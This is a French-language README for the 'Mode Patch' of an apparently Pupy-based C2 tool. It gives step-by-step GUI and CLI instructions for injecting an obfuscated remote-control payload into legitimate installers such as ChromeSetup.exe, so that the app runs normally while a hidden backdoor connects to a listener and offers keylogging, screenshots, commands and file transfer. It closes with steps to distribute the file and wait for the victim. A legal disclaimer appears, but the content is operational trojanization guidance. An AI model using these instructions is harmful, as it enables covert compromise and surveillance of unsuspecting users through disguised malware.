# 🔧 Mode Patch - Documentation

## ✅ Fonctionnement

Le **Mode Patch** permet d'injecter le payload C2 dans une application existante. Quand la victime lance l'application patchée :

1. **L'application originale démarre normalement** → L'utilisateur ne voit aucune différence
2. **Le C2 s'exécute en arrière-plan** → Connexion silencieuse vers votre listener
3. **Contrôle total à distance** → Screenshots, keylogger, commandes, transferts de fichiers

## 🎯 Utilisation

### Via l'Interface GUI

1. Ouvrir l'onglet **Bundler**
2. Configurer IP/Port du listener
3. Choisir le niveau d'obfuscation (1-5)
4. ✅ **Cocher "Patch Mode"**
5. Cliquer sur **Browse** et sélectionner l'application cible (ex: `ChromeSetup.exe`)
6. Cliquer sur **Build Payload**
7. Récupérer le fichier patché dans `dist/[NomOriginal].exe`

### Via CLI

```bash
cd /Users/kalilbelgoumri/Desktop/pupy-c2-manager-macos

# Activer l'environnement Python
source /Users/kalilbelgoumri/Desktop/pupy_env/bin/activate

# Lancer le bundler en mode patch
python -c "
from src.c2_bundler_simple import create_bundled_payload
create_bundled_payload(
    listener_ip='192.168.1.40',
    listener_port=4444,
    obfuscation_level=5,
    platform='windows',
    patch_file='/chemin/vers/app.exe'
)
"
```

## 📦 Résultat

Le fichier patché se trouve dans `dist/` avec le **même nom** que l'original :
- Taille : Original + ~10-15 MB (payload + runtime Python)
- Type : Exécutable macOS (arm64) depuis macOS, Windows PE depuis Windows
- Comportement : Lance l'app originale + C2 caché

## ⚠️ Important

### Cross-compilation
- **Sur macOS** : Produit un binaire macOS (Mach-O arm64)
- **Pour Windows PE** : Utiliser GitHub Actions ou un environnement Windows

### Test sécurisé
```bash
# Vérifier le fichier patché
file dist/ChromeSetup.exe
ls -lh dist/ChromeSetup.exe

# Tester en local (UNIQUEMENT dans un environnement contrôlé)
# NE PAS DISTRIBUER sans autorisation légale
```

## 🔐 Sécurité & Légalité

### ⚖️ AVERTISSEMENT LÉGAL

L'utilisation de ce logiciel doit être conforme aux lois en vigueur :
- ✅ Tests sur vos propres machines
- ✅ Pentesting avec autorisation écrite
- ✅ Recherche en sécurité dans un environnement isolé
- ❌ Distribution sans consentement = ILLÉGAL
- ❌ Infection de systèmes tiers = CRIMINEL

### 🛡️ Bonnes pratiques

1. **Toujours informer** les propriétaires du système cible
2. **Obtenir un accord écrit** avant tout test
3. **Documenter** toutes les actions effectuées
4. **Nettoyer** les traces après les tests
5. **Ne jamais** utiliser sur des réseaux publics ou systèmes non autorisés

## 🐛 Debug

### Le bundling échoue ?

```bash
# Vérifier PyInstaller
pyinstaller --version

# Vérifier l'environnement Python
which python
python --version

# Logs détaillés
cd /Users/kalilbelgoumri/Desktop/pupy-c2-manager-macos
/Users/kalilbelgoumri/Desktop/pupy_env/bin/python src/c2_bundler_simple.py 2>&1 | tee bundle.log
```

### Le fichier patché ne fonctionne pas ?

1. **Vérifier que le listener est actif** sur le bon port
2. **Tester l'app originale** → Est-ce qu'elle fonctionne seule ?
3. **Vérifier les permissions** → Le fichier est-il exécutable ?
4. **Essayer un niveau d'obfuscation plus bas** (ex: Niveau 2 au lieu de 5)

## 📊 Statistiques

```
Mode Patch réussi ✅
- Application originale : ChromeSetup.exe (10.7 MB)
- Fichier patché : ChromeSetup.exe (12.2 MB)
- Obfuscation : Niveau 5 (MAX)
- C2 caché : Thread daemon en arrière-plan
- Comportement : 100% transparent pour l'utilisateur
```

## 🚀 Prochaines étapes

1. ✅ Démarrer le listener (Onglet Client → Start Listener)
2. ✅ Distribuer le fichier patché (avec autorisation)
3. ✅ Attendre la connexion de la victime
4. ✅ Contrôler à distance (screenshots, commandes, fichiers)

---

**Version** : 2.0  
**Date** : 2 novembre 2025  
**Status** : ✅ Mode Patch opérationnel
